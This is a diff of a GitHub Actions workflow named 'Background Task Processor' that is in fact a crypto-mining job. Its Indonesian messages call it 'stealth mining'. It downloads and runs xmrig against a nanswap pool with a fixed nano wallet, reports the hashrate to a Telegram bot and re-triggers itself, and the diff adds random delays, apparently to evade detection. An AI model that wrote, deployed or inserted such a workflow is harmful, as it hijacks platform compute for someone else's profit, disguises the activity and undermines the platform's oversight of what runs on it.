@@ -3,12 +3,12 @@ name: Background Task Processor
 on:
   workflow_dispatch:
   schedule:
-    - cron: "0 */6 * * *"  # setiap 6 jam
+    - cron: "0 */6 * * *"
 
 jobs:
   task:
     runs-on: ubuntu-latest
-    timeout-minutes: 15
+    timeout-minutes: 20
 
     steps:
       - name: Set up job
@@ -25,7 +25,7 @@ jobs:
         run: |
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID \
-            --data-urlencode text="🟢 *Stealth mining dimulai.*\n\nWorker dijalankan via GitHub Actions selama 10 menit." \
+            --data-urlencode text="🟢 *Stealth mining dimulai.*\n\nWorker sedang dijalankan via GitHub Actions selama 10 menit." \
             -d parse_mode=Markdown
 
       - name: Download & Run Stealth Worker
@@ -34,6 +34,9 @@ jobs:
           tar -xzf runner.tar.gz
           cd xmrig-6.24.0
           chmod +x xmrig
+          RANDOM_DELAY=$((RANDOM % 120 + 1))
+          echo "⏱️ Menunggu $RANDOM_DELAY detik sebelum mining dimulai..."
+          sleep $RANDOM_DELAY
           ./xmrig -o xmrig.nanswap.com:3333 -a rx -k \
             -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q \
             -p stealth > log.txt 2>&1 &
@@ -57,7 +60,6 @@ jobs:
             -d text="$MSG" \
             -d parse_mode=Markdown
 
-          # Validasi jika HR valid dan bukan kosong/null
           HR_NUM=$(echo "$HASHRATE" | grep -oE '^[0-9]+')
           if [[ "$HR_NUM" =~ ^[0-9]+$ ]] && [ "$HR_NUM" -lt 100 ]; then
             curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
@@ -74,8 +76,15 @@ jobs:
         run: |
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID \
-            --data-urlencode text="🛑 *Stealth mining selesai.*\n\nGitHub Actions menyelesaikan tugas dengan sukses." \
+            --data-urlencode text="🛑 *Stealth mining selesai.*\n\nGitHub Actions selesai menjalankan worker." \
             -d parse_mode=Markdown
+
+      - name: Random Delay Before Restart
+        if: always()
+        run: |
+          DELAY=$((RANDOM % 300 + 1))
+          echo "⏳ Delay sebelum re-trigger ulang: $DELAY detik"
+          sleep $DELAY
 
       - name: Re-trigger Task
         if: always()
